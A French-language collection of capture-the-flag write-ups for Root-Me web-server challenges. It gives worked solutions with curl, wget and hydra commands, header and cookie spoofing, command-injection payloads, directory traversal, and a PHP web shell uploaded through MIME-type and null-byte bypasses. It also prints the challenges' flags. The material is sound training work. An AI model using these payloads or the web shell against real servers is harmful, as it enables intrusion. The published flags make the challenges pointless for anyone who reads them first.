# Web - Serveur Web - Serveur

Ces épreuves vous permettront d’appréhender les techniques intrusives retrouvées sur le web, allant de l’exploitation de faiblesses de configuration jusqu’aux injections de code côté serveur.

Ces challenges ont pour objectif de former les utilisateurs à la compréhension des langages côté serveur, du protocole HTTP et des mécanismes employés par un serveur web. C’est la série d’épreuves la plus accessible, elle permet de comprendre le fonctionnement basique de plusieurs mécanismes d’authentification, d’envoi de variables par formulaires, les traitements réalisés par les applications web, etc.

## Prérequis

- Connaitre un langage "web serveur", par exemple PHP
- Connaitre le langage SQL
- Connaitre le protocole HTTP
- Maitriser un navigateur web

---

# 96 Challenges

## 1. HTML - Code source

L'objectif est d'examiner le code source HTML d'une page web afin d'y trouver des indices ou des mots de passe cachés.

### Étapes :
1. Ouvrez la page du challenge.
2. Effectuez un **CTRL + U** ou **clic droit > afficher le code source**.
3. Recherchez dans les commentaires HTML.

Vous devriez voir quelque chose comme ceci :

```html
<!--
Je crois que c'est vraiment trop simple là !
It's really too easy !
password : nZ^&@q5&sjJHev0
-->
```

---

## 2. HTTP - Contournement de filtrage IP

Le but est de contourner un filtre basé sur l'adresse IP en utilisant un en-tête HTTP spécifique.

### Solution avec `wget` :

```bash
wget http://challenge01.root-me.org/web-serveur/ch68/ --header 'X-Forwarded-For: 192.168.1.1'
cat index.html
```

Résultat attendu :

```
Well done, the validation password is: <strong>Ip_$po0Fing</strong>
```

---

## 3. HTTP - Open redirect

L'objectif est d'exploiter une redirection ouverte, permettant de rediriger un utilisateur vers un autre site.

### Solution avec `cURL` :

```bash
curl -G http://challenge01.root-me.org/web-serveur/ch52/ -d "url=https://google.fr&h=0edf27c83d4aa4699c0625d27be0e371" -o http-open-redirect.txt
```

L’option `-G` avec `-d` permet d’envoyer des données en `GET`, et `-o` enregistre le résultat dans un fichier texte.

---

## 4. HTTP - User-agent

Certains sites accordent des permissions spéciales en fonction de l'User-Agent.

### Solution avec `cURL` :

```bash
curl -v --header "User-Agent: admin" -X GET http://challenge01.root-me.org/web-serveur/ch2/
```

Flag obtenu : `rr$Li9%L34qd1AAe27`

---

## 5. Mot de passe faible

L'objectif est de tester la robustesse d'un mot de passe en utilisant un outil de force brute.

### Solution avec `hydra` :

```bash
hydra -l admin -P rockyou.txt -e nrs -vv challenge01.root-me.org http-get /web-serveur/ch3/
```

Résultat attendu :

```
[80][http-get] host: challenge01.root-me.org   login: admin   password: admin
```

---

## 6. PHP - Injection de commande

L'objectif est d'exploiter une faille permettant d'exécuter des commandes système via un formulaire PHP.

### Étapes :
1. Trouvez un champ de saisie sur la page.
2. Injectez une commande avec `&&`.

Exemple :

```bash
127.0.0.1 && pwd /challenge/web-serveur/ch54
```

Si cela fonctionne, testez les commandes suivantes :

```bash
127.0.0.1 && ls index.php
```

Puis :

```bash
127.0.0.1 && cat index.php
```

Si `cat` est bloqué, utilisez :

```bash
127.0.0.1 && head index.php
127.0.0.1 && tail index.php
```

Résultat final :

```
$flag = "S3rv1ce...S3cure";
Flag: S3rv1ceP1n9Sup3rS3cure
```

---

## 13. HTTP - Verb tampering

L'objectif est de contourner les restrictions d'accès en manipulant les méthodes HTTP.

### Solution :

1. Utilisez une extension Firefox comme **Open HTTP requester**.
2. Envoyez une requête PUT vers :

```
http://challenge01.root-me.org/web-serveur/ch8/
```

Flag obtenu : `a23e$dme96d3saez$$prap`

---

## 20. File upload - Type MIME

NB : only GIF, JPEG or PNG are accepted

En effet, si nous y mettons une image c’est ok, si non il nous affiche
"Wrong file type !"

Pas de problème, nous allons contourner cette protection. Qui ne semble être mise que sur le champ Content-type. Pour cela nous allons utiliser un proxy local pour changer ce champ 😉 ! Pour mon cas j’utilise Burp Suite.

Le fichier que je veux uploader est le suivant :

```php
<?php
system($_GET['command']);
?>
```

En configurant le proxy local pour écouter sur 127.0.0.1:8080, et de même pour le navigateur, nous arrivons à intercepter la requête :

```
------WebKitFormBoundaryZ8GVPDDa77REhNE9
Content-Disposition: form-data; name="file"; filename="a2.php"
Content-Type: application/octet-stream

<?php
system($_GET['command']);
?>
------WebKitFormBoundaryZ8GVPDDa77REhNE9--
```

Pour faire les choses proprement, nous allons remplacer le champ Content-Type par "image/jpeg" ou "image/gif" ou n’importe quel autre type supporté.

```
------WebKitFormBoundaryZ8GVPDDa77REhNE9
Content-Disposition: form-data; name="file"; filename="a2.php"
Content-Type: image/jpeg

<?php
system($_GET['command']);
?>
------WebKitFormBoundaryZ8GVPDDa77REhNE9--
```

Et voilà, le tour est joué, nous avons à présent compromis le serveur web (rien de méchant 😛 ).

Le nom du fichier sur le serveur nous étant donné, il ne nous reste plus qu’à essayer d’y accéder et là nous avons le flag :

```
Well done ! You can validate this challenge with the password
This file is already deleted.
```

Flag : `a7n4nizpgQgnPERy89uanf6T4`

---


## 23. HTTP - Cookies

### Une solution utilisant `curl`

On clique sur le lien nous permettant de voir les emails enregistrés, et on voit que l’URL se modifie comme suit :

```
http://challenge01.root-me.org/web-serveur/ch7/?c=visiteur
```

On modifie alors la valeur `visiteur` par `admin`, mais cela nous retourne une erreur.

Regardons alors le header avec `curl` :

```bash
curl -v "http://challenge01.root-me.org/web-serveur/ch7/?c=visiteur"
```

On y voit un cookie avec la valeur : `ch7=visiteur`

Modifions à la fois la valeur de `Set-Cookie` et le paramètre `c` dans l’URL :

```bash
curl -v "http://challenge01.root-me.org/web-serveur/ch7/?c=admin" -b "ch7=admin"
```

On obtient bien en sortie :

```bash
curl -v "http://challenge01.root-me.org/web-serveur/ch7/?c=admin" -b "ch7=admin"
* Host challenge01.root-me.org:80 was resolved.
* IPv6: 2001:bc8:35b0:c166::151
* IPv4: 212.129.38.224
*   Trying [2001:bc8:35b0:c166::151]:80...
* Connected to challenge01.root-me.org (2001:bc8:35b0:c166::151) port 80
* using HTTP/1.x
> GET /web-serveur/ch7/?c=admin HTTP/1.1
> Host: challenge01.root-me.org
> User-Agent: curl/8.11.1
> Accept: */*
> Cookie: ch7=admin
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Server: nginx
< Date: Wed, 29 Jan 2025 17:14:26 GMT
< Content-Type: text/html; charset=UTF-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< Vary: Accept-Encoding
< 
<div>Validation password : ml-SYMPA
* Connection #0 to host challenge01.root-me.org left intact
</div></fieldset>   
Flag : `ml-SYMPA`
```

Cela confirme que nous avons réussi à récupérer le flag : `ml-SYMPA`

---


## 27. Directory traversal

Je propose ici une solution qui n’est basée que sur des outils CLI.

On commence donc avec cURL :
```bash
curl http://challenge01.root-me.org/web-serveur/ch15/ch15.php
```

Le code source récupéré nous indique que les liens se font avec le paramètre "galerie", on peut donc farfouiller sur le site :
```bash
curl http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=actions
curl http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=apps
```

C’est là qu’on va exploiter la faille puisque l’on peut passer à `galerie` un chemin ! Comme indiqué un peu partout sur le forum, la racine est la clef :
```bash
curl http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=/
```

On voit ici apparaître le dossier caché "86hwnX2r"

Un dernier coup de curl :
```bash
curl http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=/86hwnX2r
```

Nous montre qu’il existe un fichier `password.txt`, mais en plus nous fournit son chemin !

Il suffit de le rappatrier avec `wget` :
```bash
wget http://challenge01.root-me.org/web-serveur/ch15/galerie///86hwnX2r/password.txt
```

Et d’en afficher le contenu et de l'ouvrir dans le terminal  !

On obtient le Flag : `kcb$!Bx@v4Gs9Ez`

---

## 28. File upload - Null byte

Passer ce niveau est très facile. Utilisez le même shell que précédemment. Imaginons que le nom du fichier de votre shell soit `shell.php`. Renommez-le en `shell.php%00.jpg`. Lors de la soumission, l'extension `.jpg` sera supprimée à cause du byte nul qui précède. Une fois le fichier téléchargé, cliquez dessus.

Flag : `YPNchi2NmTwygr2dgCCF`

---
